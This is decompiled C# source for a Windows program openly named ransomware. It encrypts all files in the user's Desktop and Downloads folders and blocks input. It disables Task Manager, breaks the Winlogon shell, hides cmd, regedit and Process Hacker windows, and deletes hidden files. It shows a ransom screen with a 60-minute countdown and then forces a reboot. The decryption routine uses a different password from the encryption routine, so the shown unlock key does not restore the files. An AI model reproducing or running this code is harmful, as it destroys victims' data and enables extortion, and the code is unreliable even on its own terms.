using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Rasomware2._0;

public class Ransomware2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private IContainer components = null;

	private Label lbl1;

	private TextBox codebox;

	private Button button1;

	private Label label2;

	private Label label3;

	private Timer tmr_hide;

	private Timer tmr_show;

	private Timer tmr_if;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private Label label1;

	private Label label4;

	private Label label5;

	private Label label6;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public Ransomware2()
	{
		InitializeComponent();
		((Control)label2).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label2).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_hide.Start();
		tmr_show.Start();
		tmr_if.Start();
		tmr_encrypt.Start();
		tmr_clock.Start();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		tmr_hide.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
		Thawouse();
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		tmr_show.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		tmr_if.Start();
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		tmr_encrypt.Stop();
		Start_Encrypt();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		tmr_clock.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("Ransomware2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)codebox).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "Wrong key", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)codebox).get_Text() == "348912")
		{
			MessageBox.Show("Corrent key", "Sukces", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			OFF_Encrypt();
			Process[] array = null;
			array = Process.GetProcessesByName("Rasomware2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "348912";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_032a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Expected O, but got Unknown
		//IL_03e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ee: Expected O, but got Unknown
		//IL_0720: Unknown result type (might be due to invalid IL or missing references)
		//IL_072a: Expected O, but got Unknown
		//IL_07f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0800: Expected O, but got Unknown
		//IL_0841: Unknown result type (might be due to invalid IL or missing references)
		//IL_084b: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware2));
		lbl1 = new Label();
		codebox = new TextBox();
		button1 = new Button();
		label2 = new Label();
		label3 = new Label();
		tmr_hide = new Timer(components);
		tmr_show = new Timer(components);
		tmr_if = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_clock = new Timer(components);
		label1 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		((Control)this).SuspendLayout();
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_Font(new Font("Arial Narrow", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(13, 13));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(0, 25));
		((Control)lbl1).set_TabIndex(2);
		((Control)codebox).set_BackColor(Color.Black);
		((Control)codebox).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)codebox).set_ForeColor(SystemColors.Info);
		((Control)codebox).set_Location(new Point(533, 640));
		((Control)codebox).set_Name("codebox");
		((Control)codebox).set_Size(new Size(398, 31));
		((Control)codebox).set_TabIndex(5);
		codebox.set_TextAlign((HorizontalAlignment)2);
		((Control)codebox).add_TextChanged((EventHandler)codebox_TextChanged);
		((Control)button1).set_BackColor(Color.Black);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).set_FlatStyle((FlatStyle)1);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(533, 670));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(398, 60));
		((Control)button1).set_TabIndex(6);
		((Control)button1).set_Text("DECRYPT FILES");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Black);
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Arial", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(310, 636));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(131, 34));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("00:00:00");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Black);
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(58, 633));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(260, 37));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("REAMING TIME:");
		tmr_hide.set_Enabled(true);
		tmr_hide.set_Interval(10000);
		tmr_hide.add_Tick((EventHandler)tmr_hide_Tick);
		tmr_show.set_Enabled(true);
		tmr_show.set_Interval(1000);
		tmr_show.add_Tick((EventHandler)tmr_show_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(300);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(1000);
		tmr_encrypt.add_Tick((EventHandler)tmr_encrypt_Tick);
		tmr_clock.set_Enabled(true);
		tmr_clock.set_Interval(3600000);
		tmr_clock.add_Tick((EventHandler)tmr_clock_Tick);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(144, 68));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(35, 13));
		((Control)label1).set_TabIndex(9);
		((Control)label1).set_Text("label1");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(442, 146));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(35, 13));
		((Control)label4).set_TabIndex(10);
		((Control)label4).set_Text("label4");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(547, 110));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(35, 13));
		((Control)label5).set_TabIndex(11);
		((Control)label5).set_Text("label5");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Location(new Point(599, 174));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(35, 13));
		((Control)label6).set_TabIndex(12);
		((Control)label6).set_Text("label6");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.WhiteSmoke);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(1350, 729));
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)codebox);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Ransomware2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Kill");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware2_FormClosing));
		((Form)this).add_Load((EventHandler)Ransomware2_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
